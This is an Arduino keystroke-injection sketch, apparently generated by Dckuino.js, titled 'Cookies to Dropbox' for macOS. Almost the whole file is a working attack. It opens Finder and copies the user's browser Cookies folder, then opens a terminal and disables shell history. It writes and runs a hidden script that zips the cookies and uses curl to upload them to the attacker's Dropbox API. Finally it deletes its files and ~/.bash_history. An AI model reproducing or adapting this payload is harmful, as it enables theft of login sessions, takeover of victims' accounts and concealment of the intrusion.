// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This Script will copy the Cookies folder and send them to your dropbox API
  // Replace '<SYSTEM USERNAME HERE>' with the systems actual username
  // Replace '<YOUR API KEY HERE>' with your actual Dropbox API key
  // Here's the breakdown, we navigate to the finder
  // use the Shift GUI G to open up the "go to folder" menu.
  // Then we search for & open the library folder.
  // Now we can type "cook" to navigate to the cookies folder
  // we copy it and navigate to a new window to paste the folder
  // Then we zip the folder and send it to the dropbox
  // Using the nohup and & to make sure the code is executed
  // Requirements Must have at least two windows open
  // Dropbox API key and targets system username
  // Author: Narsty
  // Title: Cookies to Dropbox
  // Version 1.0 MacOs
  // Category: Execution
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("Finder");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('g');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("/Users/<SYSTEM USERNAME HERE>/Library");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("cook");

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('c');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_RIGHT_ARROW);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('v');
  Keyboard.releaseAll();

  delay(4000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" echo 'cd ~/Desktop && zip -r cookies.zip cookies && curl -X POST https://content.dropboxapi.com/2/files/upload -H \"Authorization: Bearer <YOUR API KEY HERE>\" -H \"Dropbox-API-Arg: {\\\"path\\\": \\\"/cookies.zip\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false}\" -H \"Content-Type: application/octet-stream\" --data-binary @cookies.zip' > upload.sh");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(2000);

  Keyboard.print(" chmod +x upload.sh");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" nohup ./upload.sh >/dev/null 2>&1 &");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print(" rm -r ~/Desktop/cookies");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" rm upload.sh");

  delay(500);

  typeKey(KEY_RETURN);

  delay(5000);

  Keyboard.print(" rm -r ~/Desktop/cookies.zip");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" CLEAR");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" rm ~/.bash_history");

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  delay(500);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}